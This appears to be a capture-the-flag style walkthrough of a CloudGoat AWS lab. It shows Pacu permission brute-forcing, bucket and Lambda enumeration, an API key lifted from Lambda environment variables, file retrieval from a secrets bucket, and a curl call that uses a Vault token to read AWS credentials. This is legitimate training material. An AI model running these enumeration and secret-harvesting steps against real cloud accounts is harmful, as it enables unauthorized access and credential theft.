
## Initial Access

Configure our credentials:

```bash
aws configure —profile cloud
```

## Enumerating Base Credentials

From here we want to enumerate our permissions on our account.

Unfortunately, we don’t have permissions to list all permissions — however, utilizing Pacu we can brute-force permissions and see we can do the following:

```bash
"lambda:ListFunctions",
"dynamodb:DescribeEndpoints",
"sts:GetSessionToken",
"sts:GetCallerIdentity",
"s3:ListBuckets"
```

### ✅ **Current Permissions Summary**

| Permission | Description |
| --- | --- |
| `lambda:ListFunctions` | List all deployed Lambda functions — you may discover code or ARNs to exploit. |
| `dynamodb:DescribeEndpoints` | Not too helpful on its own — likely irrelevant here. |
| `sts:GetSessionToken` | Useful to request temporary credentials (probably later in the chain). |
| `sts:GetCallerIdentity` | Identify who you are (e.g., ARN, Account ID, User ID). |
| `s3:ListBuckets` | List the names of all S3 buckets — doesn't give contents yet. |

## Enumerating Buckets

Since we have list bucket permissions — let’s list them and see if we find anything:

```bash
Found bucket "cg-secrets-bucket-..."
Found bucket "elasticbeanstalk-us-east-1-..."
```

## Enumerating Lambda

We find an API key and some roles:

- API Key: `DavidsDelightfulDonuts2023`
- Role: `lambda_execution_role-...`

```json
"FunctionName": "cloudgoat-secrets-lambda-...",
"Environment": {
  "Variables": {
    "API_KEY": "DavidsDelightfulDonuts2023"
  }
}
```

## Summary of Current Findings

### ✅ Lambda Function
- Env var: API Key found
- Role used by function noted

### ✅ S3 Buckets
- One secrets-related
- One possibly used by Elastic Beanstalk

## Invoke Lambda Functions

```bash
aws lambda invoke --function-name cloudgoat-secrets-lambda-... response.json --region us-east-1 --profile cloud
```

Check the output:

```bash
cat response.json
{"errorMessage": "Unable to import module 'lambda_function': No module named 'lambda_function'"}
```

## S3 Enumeration

```bash
aws s3 ls s3://cg-secrets-bucket-.../nates_web_app_url.txt --profile cloud --region us-east-1
aws s3 cp s3://cg-secrets-bucket-.../nates_web_app_url.txt . --profile cloud --region us-east-1
cat nates_web_app_url.txt
http://3.239.102.94:8080
```

## Exploring the Webpage

A form for an API key is found. Using the API key returns a Vault Token:

- Vault Token: `TorysTotallyTubular456`

## What’s a Vault Token?

A Vault token is a temporary authentication credential used to access secrets in HashiCorp Vault.

Example API call:

```bash
curl -H "X-Vault-Token: TorysTotallyTubular456" http://<vault-server>:8200/v1/secret/data/aws-creds
```

Confirmed that this is a HashiCorp Vault endpoint — useful for understanding the flow.

---
